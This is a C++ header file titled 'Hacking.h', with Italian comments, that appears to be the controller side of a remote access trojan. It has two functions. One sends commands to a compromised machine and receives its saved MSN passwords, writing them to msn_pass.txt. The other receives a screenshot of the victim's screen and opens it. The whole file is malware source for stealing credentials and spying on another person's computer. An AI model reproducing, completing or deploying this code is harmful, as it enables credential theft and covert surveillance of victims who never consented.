/* 
 * File:   Hacking.h
 * Author: redo86
 *
 * Created on 4 luglio 2010, 15.15
 */

#ifndef HACKING_H
#define	HACKING_H



#endif	/* HACKING_H */

#include<iostream>
using namespace std;


#define SIZE 30
#define SCREENNAME "Screenshoot.bmp"
#define VIEWSOFT "eog" //software per la gestione delle immagini

//definizione funzioni
void MsnPassword(string);//copia le password msn
void Screen(string);//fa uno screen dello schermo sul server


void MsnPassword(string cmd){
     long int dime;
     char *str,size[SIZE];
     FILE *fp;
     send(cl_sk,cmd.c_str(),cmd.size(),0);
     int fine=recv(cl_sk,size,SIZE,0);
     size[fine]='\0';
     dime=atoi(size);
     if(dime<=0){cout<<"Si e\' verificato un errore o non ci sono password salvate"<<endl<<endl;return;}
     str=new char[dime];
     recv(cl_sk,str,dime,0);
     fp=fopen("msn_pass.txt","wb");
     fwrite(str,1,dime,fp);
     fclose(fp);
     cout<<"Operazione conclusa,le password sono contenute nel file "<<Hostname<<"/msn_pass.txt"<<endl<<endl;
     return;

}

void Screen(string cmd){
     send(cl_sk,cmd.c_str(),cmd.size(),0);
     char size[SIZE];
     long int file_size=0;
     int dwbr=0;

     char buffer[MAX_PATH];
     int fine=recv(cl_sk,size,SIZE,0);
     size[fine]='\0';
     file_size=atoi(size);
     cout<<"Ricezione immagine in corso..."<<endl<<endl;
     FILE *fp;
     fp=fopen(SCREENNAME,"wb");
     while (1){

           dwbr=recv(cl_sk,buffer,MAX_PATH,0);
           fwrite (buffer , 1 , dwbr , fp );
           file_size-=dwbr;
           if(file_size<=0)break;

     }

     fclose(fp);
     string exec=VIEWSOFT;
     exec+=" ";
     exec+= SCREENNAME;
     system(exec.c_str());
     return;

}